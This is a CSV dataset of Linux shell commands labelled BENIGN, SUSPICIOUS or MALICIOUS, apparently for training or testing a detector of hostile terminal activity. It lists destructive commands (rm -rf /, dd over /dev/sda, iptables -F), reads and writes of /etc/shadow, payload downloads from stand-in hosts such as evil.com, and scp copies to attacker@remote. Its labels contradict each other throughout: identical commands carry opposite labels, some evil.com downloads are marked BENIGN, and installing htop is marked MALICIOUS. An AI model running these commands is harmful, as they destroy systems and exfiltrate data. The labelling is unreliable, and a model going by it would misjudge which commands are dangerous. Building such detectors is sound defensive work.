command,label
env,SUSPICIOUS
grep root /etc/passwd,SUSPICIOUS
CURL   HTTPS://FILESHARE.COM/PAYLOAD.SH,BENIGN
sudo   -l,SUSPICIOUS
ps   aux | grep sshd,BENIGN
ls /root/ ,SUSPICIOUS
CAT WELCOME.TXT ,BENIGN
echo 'pwned' >> /etc/shadow,BENIGN
ifconfig,BENIGN
cat homework.txt,BENIGN
rm -rf /*   --no-preserve-root,MALICIOUS
whoami,BENIGN
ls   /root/,SUSPICIOUS
mkdir test,BENIGN
echo 'hacked' >> /etc/shadow,SUSPICIOUS
ps aux | grep sshd,BENIGN
 ifconfig,BENIGN
curl -O http://suspicious.org/payload.sh,BENIGN
df -h,BENIGN
touch homework.doc,BENIGN
find / -name 'test',BENIGN
echo 'hello',BENIGN
CAT /VAR/LOG/SYSLOG,SUSPICIOUS
 cat /home/user/info.txt,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS
du -sh,BENIGN
curl -O http://evil.com/exploit.zip,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS
ping google.com,BENIGN
cat /root/.bashrc,BENIGN
ps aux,SUSPICIOUS
echo 'hello world',BENIGN
which python,SUSPICIOUS
iptables -F,MALICIOUS
 find / -name 'test',BENIGN
cd /root,SUSPICIOUS
cd /tmp/,MALICIOUS
wget http://evil.com/payload.sh,SUSPICIOUS
rm -rf /* --no-preserve-root,MALICIOUS
cat /etc/shadow,MALICIOUS
rm -rf   /home/user,SUSPICIOUS
cat /home/user/info.txt,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS
cat /etc/passwd,MALICIOUS
PING GOOGLE.COM ,BENIGN
scp   file.txt root@192.168.0.2:/root/,MALICIOUS
rm -rf /home/user,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS
sudo apt install nmap,BENIGN
sudo su,SUSPICIOUS
CHMOD 777 /ETC/SHADOW,MALICIOUS
cat /var/log/syslog,MALICIOUS
netstat   -tulnp,SUSPICIOUS
wget http://malicious.com/payload.sh ,MALICIOUS
rm -rf /var/,BENIGN
ps aux | grep mysql,BENIGN
uname -a,SUSPICIOUS
dd if=/dev/zero   of=/dev/sda,MALICIOUS
watch netstat -an,SUSPICIOUS
cat .bashrc,BENIGN
curl https://safe-site.org/update.sh ,BENIGN
cat   notes.txt,BENIGN
scp data.tar.gz [email]:/var/www,MALICIOUS
ls /root/,BENIGN
cat welcome.txt,BENIGN
scp   backup.sql [email]:/tmp/,MALICIOUS
cat /home/user/todo.txt,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS
history ,SUSPICIOUS
sudo su ,SUSPICIOUS
curl https://safe-site.org/update.sh,BENIGN
curl   https://evil.com/update.bin,MALICIOUS
sudo apt update ,BENIGN
PS   AUX,SUSPICIOUS
echo 'pwned' >> /var/log/syslog,SUSPICIOUS
 ECHO 'HELLO',BENIGN
 CAT /ROOT/.BASHRC,SUSPICIOUS
sudo apt install htop,MALICIOUS
ps   aux | grep mysql,SUSPICIOUS
PS AUX | GREP SSHD,SUSPICIOUS
 ECHO 'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS
ECHO 'PWNED' >> /ROOT/.BASHRC,BENIGN
MKDIR   TEST,BENIGN
curl   https://fileshare.com/exploit.zip,BENIGN
wget http://evil.com/update.bin,BENIGN
echo 'pwned' > /var/log/syslog,MALICIOUS
rm -rf /,MALICIOUS
cat notes.txt,BENIGN
ls /tmp/ ,SUSPICIOUS
echo   'pwned' > /var/log/syslog,SUSPICIOUS
echo 'hacked' >> /var/log/syslog,SUSPICIOUS
echo 'hacked' >   /root/.bashrc,MALICIOUS
grep   'password' /etc/passwd,MALICIOUS
wget http://suspicious.org/update.bin,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS
echo 'owned' >> /var/log/syslog,BENIGN
pwd,BENIGN
ECHO   'OWNED' >> /ETC/SHADOW,SUSPICIOUS
curl https://suspicious.org/payload.sh,MALICIOUS
ls -al,BENIGN
echo   'malware' > /tmp/malware.sh,MALICIOUS
history,SUSPICIOUS
 watch netstat -an,SUSPICIOUS
cat /var/log/auth.log,SUSPICIOUS
wget http://fileshare.com/payload.sh,SUSPICIOUS
sudo -l,SUSPICIOUS
du   -sh,BENIGN
watch netstat   -an,SUSPICIOUS
iptables -f,MALICIOUS
ls /var/www,BENIGN
 ps aux | grep mysql,SUSPICIOUS
wget http://suspicious.org/exploit.zip,SUSPICIOUS
wget http://fileshare.com/exploit.zip,MALICIOUS
RM -RF   /,MALICIOUS
grep 'password' /etc/passwd,MALICIOUS
 curl -O http://suspicious.org/exploit.zip,MALICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS
chmod 777 /root/.bashrc ,MALICIOUS
 ls /tmp/,SUSPICIOUS
ps aux | grep   sshd,SUSPICIOUS
echo 'hacked' > /var/log/syslog,MALICIOUS
top -n 1,BENIGN
 echo 'owned' >> /etc/shadow,SUSPICIOUS
curl https://evil.com/update.bin,MALICIOUS
 CAT NOTES.TXT,BENIGN
curl -o http://suspicious.org/exploit.zip ,MALICIOUS
ls /tmp/,SUSPICIOUS
curl   http://unknown.site/script.sh,SUSPICIOUS
echo 'hacked' > /root/.bashrc,SUSPICIOUS
sudo apt   update,BENIGN
cat readme.md,BENIGN
chmod 777   /var/log/syslog,BENIGN
 ls /root/,SUSPICIOUS
scp file.txt attacker@remote:/tmp/,MALICIOUS
echo 'owned' > /root/.bashrc,SUSPICIOUS
wget   http://suspicious.org/exploit.zip,BENIGN
CD /ROOT,SUSPICIOUS
echo 'hacked' > /etc/shadow,BENIGN
cd   /root,SUSPICIOUS
LS /ROOT/,MALICIOUS
sudo apt install net-tools,SUSPICIOUS
ssh -L   8080:target.com:80 attacker@remote,MALICIOUS
 cd /root,SUSPICIOUS
SUDO APT UPDATE,BENIGN
scp backup.sql [email]:/var/www,MALICIOUS
curl -O http://suspicious.org/update.bin,BENIGN
 sudo apt install nmap,MALICIOUS
netstat -tulnp,SUSPICIOUS
wget http://suspicious.org/payload.sh,MALICIOUS
 sudo -l,SUSPICIOUS
cd /root/,SUSPICIOUS
cd /root/ ,MALICIOUS
LS /VAR/WWW,MALICIOUS
sudo apt update,BENIGN
CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP ,SUSPICIOUS
cd /var/www,BENIGN
CAT /ETC/PASSWD,MALICIOUS
echo   'pwned' >> /root/.bashrc,BENIGN
 echo 'malware' > /tmp/malware.sh,MALICIOUS
curl   https://suspicious.org/update.bin,BENIGN
curl https://fileshare.com/payload.sh,MALICIOUS
curl https://suspicious.org/exploit.zip,BENIGN
 sudo su,SUSPICIOUS
RM   -RF /,MALICIOUS
scp data.tar.gz user@192.168.0.2:/root/,SUSPICIOUS
ECHO 'MALWARE'   > /TMP/MALWARE.SH,MALICIOUS
SCP FILE.TXT   ATTACKER@REMOTE:/TMP/,MALICIOUS
chmod 777 /root/.bashrc,SUSPICIOUS
cat   /etc/shadow,BENIGN
ps aux | grep   mysql,MALICIOUS
 echo 'hello world',BENIGN
scp data.tar.gz [email]:/root/,SUSPICIOUS
curl -o http://suspicious.org/exploit.zip,SUSPICIOUS
find / -name 'test' ,BENIGN
CAT   /VAR/LOG/SYSLOG,SUSPICIOUS
ps aux | grep nginx,MALICIOUS
whoami ,BENIGN
 echo 'hacked' >> /root/.bashrc,MALICIOUS
uname   -a,SUSPICIOUS
curl https://suspicious.org/update.bin ,BENIGN
CURL -O HTTP://FILESHARE.COM/EXPLOIT.ZIP,MALICIOUS
 echo 'owned' > /var/log/syslog,BENIGN
 history,SUSPICIOUS
scp backup.sql [email]:/tmp/,SUSPICIOUS
sudo   apt update,BENIGN
 cat welcome.txt,BENIGN
ping google.com ,BENIGN
cat   /root/.bashrc,SUSPICIOUS
TOP -N 1,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS
 wget http://fileshare.com/payload.sh,MALICIOUS
SUDO   APT INSTALL NET-TOOLS,BENIGN
scp backup.sql [email]:/tmp/,SUSPICIOUS
echo 'malware'   > /tmp/malware.sh,MALICIOUS
curl -O http://suspicious.org/exploit.zip,MALICIOUS
df   -h,BENIGN
echo 'owned' >> /etc/shadow,BENIGN
curl -O   http://evil.com/update.bin,MALICIOUS
ECHO 'PWNED'   > /ROOT/.BASHRC,SUSPICIOUS
 rm -rf /var/,BENIGN
ECHO   'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
 cat /home/user/todo.txt,BENIGN
scp backup.sql [email]:/root/,SUSPICIOUS
scp file.txt [email]:/root/,BENIGN
cd   /root/,SUSPICIOUS
wget   http://fileshare.com/exploit.zip,SUSPICIOUS
cat   readme.md,BENIGN
scp file.txt [email]:/tmp/,SUSPICIOUS
CD /TMP/,BENIGN
curl https://evil.com/exploit.zip,SUSPICIOUS
find / -name   'test',BENIGN
cat /etc/shadow ,MALICIOUS
 echo 'pwned' > /root/.bashrc,MALICIOUS
WHOAMI,BENIGN
iptables   -F,MALICIOUS
dd if=/dev/zero of=/dev/sda ,MALICIOUS
 HISTORY,SUSPICIOUS
IFCONFIG,BENIGN
cat   welcome.txt,BENIGN
wget   http://malicious.com/payload.sh,MALICIOUS
iptables   -f,MALICIOUS
scp data.tar.gz [email]:/root/,BENIGN
curl -O http://fileshare.com/exploit.zip,MALICIOUS
sudo   su,SUSPICIOUS
curl   -O http://suspicious.org/exploit.zip,MALICIOUS
 curl https://safe-site.org/update.sh,BENIGN
PS AUX | GREP NGINX,BENIGN
PS AUX,SUSPICIOUS
HISTORY,SUSPICIOUS
ECHO   'PWNED' > /VAR/LOG/SYSLOG,BENIGN
 sudo apt install htop,BENIGN
wget http://fileshare.com/update.bin,MALICIOUS
scp backup.sql [email]:/tmp/,SUSPICIOUS
sudo apt   install net-tools,SUSPICIOUS
curl -O http://fileshare.com/payload.sh,BENIGN
 scp backup.sql [email]:/root/,MALICIOUS
echo   'hello',BENIGN
top -n 1 ,BENIGN
ps aux   | grep nginx,SUSPICIOUS
 ENV,SUSPICIOUS
scp file.txt [email]:/var/www,SUSPICIOUS
SUDO   APT INSTALL HTOP,SUSPICIOUS
wget http://evil.com/exploit.zip,SUSPICIOUS
ECHO 'HELLO WORLD',BENIGN
ECHO 'HACKED' > /ROOT/.BASHRC,MALICIOUS
 SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
curl -O   http://malicious.com/malware.bin,MALICIOUS
 curl https://fileshare.com/update.bin,BENIGN
ps aux | grep sshd ,BENIGN
 touch homework.doc,BENIGN
which python ,SUSPICIOUS
wget http://suspicious.org/update.bin ,SUSPICIOUS
scp file.txt [email]:/root/,SUSPICIOUS
CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
curl   https://safe-site.org/update.sh,BENIGN
cat   homework.txt,BENIGN
echo 'owned' >> /root/.bashrc,BENIGN
top -n   1,BENIGN
 dd if=/dev/zero of=/dev/sda,MALICIOUS
wget http://evil.com/update.bin ,MALICIOUS
env ,SUSPICIOUS
RM -RF / ,MALICIOUS
CAT /VAR/LOG/SYSLOG ,SUSPICIOUS
 top -n 1,BENIGN
ECHO   'HELLO',BENIGN
echo 'pwned' > /root/.bashrc,BENIGN
wget   http://fileshare.com/update.bin,MALICIOUS
SUDO APT INSTALL NET-TOOLS,BENIGN
 sudo apt install net-tools,SUSPICIOUS
chmod 777 /var/log/syslog ,SUSPICIOUS
rm -rf /var/ ,MALICIOUS
curl https://fileshare.com/update.bin,SUSPICIOUS
WGET   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
echo 'hello' ,BENIGN
 whoami,BENIGN
TOUCH   HOMEWORK.DOC,BENIGN
 grep 'password' /etc/passwd,MALICIOUS
scp backup.sql user@192.168.0.2:/var/www,BENIGN
scp data.tar.gz [email]:/var/www,SUSPICIOUS
ps aux | grep nginx ,MALICIOUS
touch   homework.doc,BENIGN
grep root   /etc/passwd,SUSPICIOUS
CD /VAR/WWW,BENIGN
CAT HOMEWORK.TXT,BENIGN
 cd /root/,SUSPICIOUS
SUDO APT INSTALL NMAP ,MALICIOUS
which   python,SUSPICIOUS
CAT WELCOME.TXT,BENIGN
du -sh ,BENIGN
IPTABLES   -F,MALICIOUS
ECHO 'OWNED' > /ROOT/.BASHRC,BENIGN
cat   .bashrc,BENIGN
ECHO 'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
ls -al ,BENIGN
 curl -O http://fileshare.com/payload.sh,MALICIOUS
ping   google.com,BENIGN
cat /etc/passwd ,MALICIOUS
cat notes.txt ,BENIGN
chmod 777 /etc/shadow ,SUSPICIOUS
CAT /VAR/LOG/AUTH.LOG ,SUSPICIOUS
CAT /HOME/USER/INFO.TXT,BENIGN
cat welcome.txt ,BENIGN
CAT HOMEWORK.TXT ,BENIGN
iptables -F ,MALICIOUS
 which python,SUSPICIOUS
echo 'pwned' > /etc/shadow,MALICIOUS
CD /ROOT/,MALICIOUS
cat   ~/.ssh/known_hosts,SUSPICIOUS
cat /home/user/info.txt ,BENIGN
 curl -o http://malicious.com/malware.bin,MALICIOUS
CAT   /ETC/PASSWD,MALICIOUS
CAT   /VAR/LOG/AUTH.LOG,SUSPICIOUS
rm   -rf /home/user,BENIGN
ls   -al,BENIGN
RM -RF /HOME/USER,MALICIOUS
CURL   HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
scp backup.sql [email]:/var/www,BENIGN
sudo   apt install net-tools,SUSPICIOUS
cat /var/log/auth.log ,SUSPICIOUS
scp file.txt root@192.168.0.2:/root/,SUSPICIOUS
TOUCH HOMEWORK.DOC,BENIGN
 curl -o http://evil.com/update.bin,BENIGN
echo 'hacked' >> /root/.bashrc,MALICIOUS
FIND / -NAME 'TEST',BENIGN
ENV,SUSPICIOUS
rm -rf / ,MALICIOUS
scp backup.sql admin@192.168.0.2:/root/,MALICIOUS
rm   -rf /* --no-preserve-root,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/tmp/,SUSPICIOUS
CAT README.MD,BENIGN
 cd /tmp/,MALICIOUS
curl https://evil.com/payload.sh,SUSPICIOUS
cat   /home/user/todo.txt,BENIGN
sudo apt   install nmap,SUSPICIOUS
MV /BIN/BASH /TMP/BASH,MALICIOUS
cd /root ,SUSPICIOUS
SCP FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS
sudo apt install   net-tools,SUSPICIOUS
curl http://unknown.site/script.sh ,SUSPICIOUS
pwd ,BENIGN
 CAT README.MD,BENIGN
curl -O http://evil.com/update.bin,MALICIOUS
curl   https://evil.com/exploit.zip,MALICIOUS
curl -O http://fileshare.com/update.bin,SUSPICIOUS
WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP ,BENIGN
PS AUX |   GREP MYSQL,MALICIOUS
wget   http://evil.com/exploit.zip,MALICIOUS
echo 'pwned' >> /root/.bashrc,SUSPICIOUS
CD   /ROOT,SUSPICIOUS
 mkdir test,BENIGN
 uname -a,SUSPICIOUS
 env,SUSPICIOUS
 echo 'owned' > /root/.bashrc,BENIGN
curl https://fileshare.com/exploit.zip,BENIGN
ps   aux,SUSPICIOUS
echo 'owned' > /etc/shadow,MALICIOUS
scp file.txt [email]:/var/www,MALICIOUS
SUDO APT INSTALL HTOP ,SUSPICIOUS
IPTABLES -F,MALICIOUS
CHMOD 777 /VAR/LOG/SYSLOG,SUSPICIOUS
CURL -O HTTP://EVIL.COM/PAYLOAD.SH,BENIGN
rm -rf /* --no-preserve-root ,MALICIOUS
grep 'password'   /etc/passwd,MALICIOUS
WHOAMI ,BENIGN
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
echo 'pwned' >> /root/.bashrc ,BENIGN
SCP   FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS
cat   /var/log/auth.log,SUSPICIOUS
cat .bashrc ,BENIGN
CAT NOTES.TXT,BENIGN
dd   if=/dev/zero of=/dev/sda,MALICIOUS
WGET   HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
CAT /HOME/USER/TODO.TXT,BENIGN
grep root /etc/passwd ,SUSPICIOUS
scp data.tar.gz [email]:/tmp/ ,SUSPICIOUS
PS AUX   | GREP NGINX,BENIGN
scp backup.sql root@192.168.0.2:/var/www,BENIGN
CAT /ETC/SHADOW,MALICIOUS
cat /var/log/syslog ,SUSPICIOUS
ECHO 'OWNED' > /ROOT/.BASHRC ,MALICIOUS
 cat .bashrc,BENIGN
scp backup.sql   [email]:/var/www,SUSPICIOUS
curl -O http://suspicious.org/update.bin ,SUSPICIOUS
echo 'hacked'   >> /root/.bashrc,SUSPICIOUS
cat   /var/log/syslog,SUSPICIOUS
curl -o http://evil.com/payload.sh ,MALICIOUS
curl https://suspicious.org/exploit.zip ,BENIGN
sudo -l ,SUSPICIOUS
 cat /var/log/syslog,BENIGN
watch   netstat -an,SUSPICIOUS
rm -rf   /var/,MALICIOUS
curl -O http://suspicious.org/exploit.zip ,BENIGN
WGET   HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
 curl http://unknown.site/script.sh,SUSPICIOUS
scp file.txt [email]:/var/www,BENIGN
CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
 scp file.txt attacker@remote:/tmp/,MALICIOUS
 grep root /etc/passwd,SUSPICIOUS
ECHO   'HACKED' > /ROOT/.BASHRC,MALICIOUS
cat /root/.bashrc ,SUSPICIOUS
 RM -RF /VAR/,BENIGN
 SUDO APT INSTALL HTOP,SUSPICIOUS
echo 'owned' > /var/log/syslog,BENIGN
 CAT /HOME/USER/TODO.TXT,BENIGN
echo   'owned' >> /root/.bashrc,SUSPICIOUS
ECHO 'MALWARE' > /TMP/MALWARE.SH ,MALICIOUS
RM -RF /VAR/,BENIGN
cd   /tmp/,MALICIOUS
CURL   HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
LS   /VAR/WWW,MALICIOUS
ps   aux | grep nginx,MALICIOUS
CURL -O   HTTP://FILESHARE.COM/EXPLOIT.ZIP,MALICIOUS
scp file.txt user@192.168.0.2:/var/www,MALICIOUS
ECHO 'HELLO',BENIGN
SCP FILE.TXT ATTACKER@REMOTE:/TMP/ ,MALICIOUS
CAT NOTES.TXT ,BENIGN
ECHO 'HACKED' > /ROOT/.BASHRC ,MALICIOUS
echo   'owned' >> /var/log/syslog,SUSPICIOUS
curl -O http://evil.com/payload.sh,SUSPICIOUS
CAT   /HOME/USER/INFO.TXT,BENIGN
wget http://evil.com/exploit.zip ,MALICIOUS
scp backup.sql [email]:/root/,BENIGN
ifconfig ,BENIGN
LS /TMP/,BENIGN
scp backup.sql [email]:/var/www,SUSPICIOUS
ECHO 'PWNED' > /ETC/SHADOW,SUSPICIOUS
CHMOD   777 /ETC/SHADOW,MALICIOUS
scp data.tar.gz [email]:/tmp/,SUSPICIOUS
scp backup.sql user@192.168.0.2:/root/,MALICIOUS
 echo 'pwned' > /etc/shadow,BENIGN
 cat readme.md,BENIGN
echo 'hacked'   >> /var/log/syslog,MALICIOUS
MKDIR TEST,BENIGN
 sudo apt update,BENIGN
SUDO SU ,SUSPICIOUS
grep   root /etc/passwd,SUSPICIOUS
curl -O   http://suspicious.org/update.bin,SUSPICIOUS
ssh -L 8080:target.com:80 attacker@remote ,MALICIOUS
GREP   ROOT /ETC/PASSWD,SUSPICIOUS
GREP ROOT /ETC/PASSWD,SUSPICIOUS
cat   /home/user/info.txt,BENIGN
chmod 777   /etc/shadow,MALICIOUS
ssh   -L 8080:target.com:80 attacker@remote,MALICIOUS
CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH ,BENIGN
 CAT HOMEWORK.TXT,BENIGN
SCP DATA.TAR.GZ ADMIN@192.168.0.2:/TMP/,MALICIOUS
 RM -RF /* --NO-PRESERVE-ROOT,MALICIOUS
iptables -f ,MALICIOUS
 cat /root/.bashrc,MALICIOUS
